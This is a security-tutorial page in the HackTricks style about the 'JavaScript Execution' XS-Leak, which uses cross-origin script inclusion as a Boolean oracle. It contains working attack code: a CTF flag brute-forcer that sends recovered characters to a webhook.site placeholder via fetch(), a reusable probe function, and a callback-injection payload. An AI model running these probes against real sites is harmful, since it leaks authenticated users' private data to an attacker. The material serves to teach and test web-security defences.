_body: "# JavaScript Execution XS Leak\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThis XS-Search primitive turns\
  \ **whether a cross-origin response executes as JavaScript** into a **Boolean oracle**.\n\nThe usual setup is:\n\n- **Positive\
  \ state**: the target returns attacker-controlled text or sensitive content that does **not** execute as attacker JavaScript.\n\
  - **Negative state**: the target reflects attacker-controlled text into a place that is parsed as valid JavaScript, so the\
  \ attacker can force a callback such as `window.parent.foo()`.\n- **Leak**: load the target with a classic `<script src>`\
  \ and observe whether the callback fires.\n\nThis is basically an **execution oracle**, not a timing oracle. The only thing\
  \ the attacker needs is a **cross-origin script inclusion** that behaves differently depending on the secret-dependent branch.\n\
  \nFor the generic XS-Leaks background, see:\n\n{{#ref}}\nREADME.md\n{{#endref}}\n\n## When This Works\n\nThis technique\
  \ is practical when all of the following are true:\n\n- The victim is authenticated to the target origin.\n- The attacker\
  \ can make the victim browser request a **classic script** from the target origin.\n- One branch returns content that is\
  \ **valid attacker-controlled JavaScript**.\n- The other branch returns content that **does not execute the attacker callback**.\n\
  \nIn practice, the easiest cases are search/debug endpoints that:\n\n- return attacker-controlled text when a guess is wrong\n\
  - return a different body when the guess is right\n- let the attacker choose a parameter such as `callback`, `hint`, `msg`,\
  \ or a reflected prefix/suffix\n\n## Basic Example\n\nServer-side code that will try `${guess}` as a flag prefix:\n\n```javascript\n\
  app.get(\"/guessing\", function (req, res) {\n  let guess = req.query.guess\n  let page = `<html>\n                <head>\n\
  \                    <script>\n                            function foo() {\n                                // If not the\
  \ flag this will be executed\n                                window.parent.foo()\n                            }\n     \
  \                   </script>\n                    <script src=\"https://axol.space/search?query=${guess}&hint=foo()\"></script>\n\
  \                </head>\n                <p>hello2</p>\n                </html>`\n  res.send(page)\n})\n```\n\nMain page\
  \ that generates iframes to the previous `/guessing` page to test each possibility:\n\n```html\n<html>\n  <head>\n    <script>\n\
  \      let candidateIsGood = false\n      let candidate = \"\"\n      let flag = \"bi0sctf{\"\n      let guessIndex = -1\n\
  \n      let flagChars =\n        \"_0123456789abcdefghijklmnopqrstuvwxyz}ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\n      // this will\
  \ get called from our iframe IF the candidate is WRONG\n      function foo() {\n        candidateIsGood = false\n      }\n\
  \n      timerId = setInterval(() => {\n        if (candidateIsGood) {\n          flag = candidate\n          guessIndex\
  \ = -1\n          fetch(\"https://webhook.site/<yours-goes-here>?flag=\" + flag)\n        }\n\n        // Start with true\
  \ and change to false if the guess is wrong\n        candidateIsGood = true\n        guessIndex++\n        if (guessIndex\
  \ >= flagChars.length) {\n          fetch(\"https://webhook.site/<yours-goes-here>\")\n          return\n        }\n   \
  \     let guess = flagChars[guessIndex]\n        candidate = flag + guess\n        let iframe = `<iframe src=\"/guessing?guess=${encodeURIComponent(\n\
  \          candidate\n        )}\"></iframe>`\n        hack.innerHTML = iframe\n      }, 500)\n    </script>\n  </head>\n\
  \  <p>hello</p>\n  <div id=\"hack\"></div>\n</html>\n```\n\nThe attacker logic is:\n\n1. Start every candidate as \"good\"\
  .\n2. Load the target response as a script.\n3. If the response executes `window.parent.foo()`, mark the candidate as wrong.\n\
  4. If no callback fires, keep the candidate and continue brute-forcing.\n\n## Minimal Probe Pattern\n\nIn many real targets,\
  \ an iframe is not required. A direct script inclusion is enough:\n\n```html\n<script>\n  let hit = true\n  function miss()\
  \ {\n    hit = false\n  }\n\n  function probe(url) {\n    return new Promise((resolve) => {\n      hit = true\n      const\
  \ s = document.createElement(\"script\")\n      s.src = url\n      s.onload = () => resolve(hit)\n      s.onerror = () =>\
  \ resolve(false)\n      document.head.appendChild(s)\n    })\n  }\n</script>\n```\n\nIf the \"wrong guess\" branch reflects\
  \ `miss()`, then:\n\n- `probe(...) === false` means the callback executed or the load failed\n- `probe(...) === true` means\
  \ the script loaded without running the attacker callback\n\nFor reliability, use a **fresh script element per probe** and\
  \ add a **cache-buster** such as `?r=${crypto.randomUUID()}`.\n\n## Modern Caveats\n\n### It must be a classic script\n\n\
  This primitive relies on the browser fetching the resource as a **classic script**. A plain `<script src=...>` without `crossorigin`\
  \ is fetched in `no-cors` mode, which is exactly why this old pattern is still useful cross-origin.\n\nDo **not** switch\
  \ to `type=\"module\"` for this technique:\n\n- cross-origin **module scripts require CORS**\n- many targets that are includable\
  \ as classic scripts will simply fail as modules\n\n### MIME type and `nosniff` decide whether the payload executes\n\n\
  Current browsers are stricter than older writeups. If the target sets `X-Content-Type-Options: nosniff`, the browser will\
  \ block a script response whose MIME type is not a JavaScript MIME type.\n\nThat means this oracle often depends on:\n\n\
  - whether the target returns `application/javascript` / `text/javascript`\n- whether the target returns `text/plain`, `text/html`,\
  \ or JSON\n- whether `nosniff` is present\n\nThis is also why some endpoints only give a leak in one branch: one response\
  \ is accepted as script, while the other branch is blocked or parsed differently.\n\n### CORB can change the observable\
  \ result\n\nCORB adds another branch to think about. If a response is considered CORB-protected, Chromium may turn it into\
  \ an **empty valid script response** instead of surfacing a parse failure. So for some endpoints:\n\n- one state triggers\
  \ a normal script parse / callback\n- another state becomes an empty script and only `onload` fires\n\nThat is still a useful\
  \ oracle, but the signal is now **callback vs no callback** or **onload vs onerror**, not just \"JavaScript executed or\
  \ not\".\n\n### CSP can kill the attacker-controlled branch\n\nStrict CSP on the **target response** can break this primitive\
  \ when the reflected branch is no longer executable JavaScript. Public XS-Leak challenge writeups from 2022 to 2024 repeatedly\
  \ rely on this detail:\n\n- `script-src 'none'` can force attackers to pivot away from a direct execution oracle\n- CSP/SRI/CSP-report\
  \ interactions can still create **other** leak oracles, but those belong to different pages/techniques\n\nSo when the obvious\
  \ callback trick does not work, inspect response headers before discarding the endpoint.\n\n## Useful Variants\n\n### Callback-parameter\
  \ endpoints\n\nThe most convenient target is a JSONP-style or debug endpoint that accepts a parameter such as:\n\n- `callback=...`\n\
  - `cb=...`\n- `jsonp=...`\n- `hint=...`\n- `msg=...`\n\nIf the \"miss\" branch reflects that value verbatim into executable\
  \ JavaScript while the \"hit\" branch returns different content, you get a direct Boolean oracle with no timing measurement.\n\
  \n### Syntax-preserving prefixes and suffixes\n\nSometimes you cannot fully control the response body, but you can still\
  \ make the negative branch execute:\n\n- close the current string or function argument\n- inject the callback\n- comment\
  \ out the trailing bytes\n\nFor example, a reflected branch like:\n\n```javascript\nshowResult(\"<attacker>\");\n```\n\n\
  can often be turned into:\n\n```javascript\nshowResult(\"\");window.parent.foo();//\");\n```\n\nIf the positive branch does\
  \ not reflect that payload, the callback becomes the oracle.\n\n### Combining with event-based oracles\n\nIf the endpoint\
  \ is unstable across browsers, mix the execution oracle with the generic script load events already covered in the section\
  \ index:\n\n- callback fired\n- `onload`\n- `onerror`\n\nThis is especially useful when one branch yields valid JavaScript\
  \ and another branch yields blocked MIME / CORB / CSP behavior.\n\nRelated pages:\n\n- [Cookie Bomb + Onerror XS Leak](cookie-bomb-+-onerror-xs-leak.md)\n\
  - [performance.now example](performance.now-example.md)\n\n## Practical Notes\n\n- Prefer **one bit per request** and keep\
  \ the callback side effect simple.\n- If you probe many candidates, remove previously inserted `<script>` elements or isolate\
  \ each attempt in a fresh iframe.\n- Cache and service worker behavior can poison the oracle; use cache-busting.\n- This\
  \ primitive is strongest when the negative branch is **fully attacker-controlled JavaScript**. If you only get partial reflection,\
  \ the exploit becomes a payload-shaping problem rather than an XS-Search problem.\n\n## References\n\n- [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)\n\
